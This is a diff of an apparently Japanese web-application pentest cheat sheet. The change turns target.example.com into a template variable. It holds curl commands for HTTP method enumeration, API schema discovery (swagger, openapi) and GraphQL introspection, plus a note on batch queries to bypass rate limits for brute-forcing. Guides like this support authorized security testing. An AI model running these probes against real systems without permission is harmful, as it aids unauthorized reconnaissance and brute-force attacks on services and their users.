 for m in GET POST PUT DELETE PATCH OPTIONS; do
   echo "== $m =="
-  curl -sk -X $m "https://target.example.com/api/user/1" -H "Authorization: Bearer &lt;TOKEN&gt;" -o /dev/null -w "%{http_code}\n"
+  curl -sk -X $m "https://<span class="v" data-var="TARGET">target.example.com</span>/api/user/1" -H "Authorization: Bearer <span class="v">&lt;TOKEN&gt;</span>" -o /dev/null -w "%{http_code}\n"
 done
 
 <span class="c"># バージョン差異の悪用 (旧 API の脆弱性残存)</span>
 <span class="c"># /api/v1/ /api/v2/ /api/internal/</span>
 
 <span class="c"># ドキュメント / スキーマ探索</span>
-curl -s https://target.example.com/swagger.json
-curl -s https://target.example.com/openapi.json
-curl -s https://target.example.com/api/docs</code></pre></div>
+curl -s https://<span class="v" data-var="TARGET">target.example.com</span>/swagger.json
+curl -s https://<span class="v" data-var="TARGET">target.example.com</span>/openapi.json
+curl -s https://<span class="v" data-var="TARGET">target.example.com</span>/api/docs</code></pre></div>
 
       <h3>GraphQL</h3>
       <div class="code"><div class="code-bar"><span class="code-lang">bash</span><button class="copy">copy</button></div><pre><code><span class="c"># introspection でスキーマ全体を取得</span>
-curl -s https://target.example.com/graphql \
+curl -s https://<span class="v" data-var="TARGET">target.example.com</span>/graphql \
   -H "Content-Type: application/json" \
   -d '{"query":"{__schema{types{name fields{name}}}}"}'
 
 <span class="c"># introspection query (完全版は clairvoyance / graphw00f で自動化)</span>
-<span class="c"># graphw00f -d -f -t https://target.example.com/graphql</span></code></pre></div>
+<span class="c"># graphw00f -d -f -t https://<span class="v" data-var="TARGET">target.example.com</span>/graphql</span></code></pre></div>
 
       <div class="code"><div class="code-bar"><span class="code-lang">graphql</span><button class="copy">copy</button></div><pre><code><span class="c"># バッチクエリでレート制限回避 (bruteforce 増幅)</span>
 {
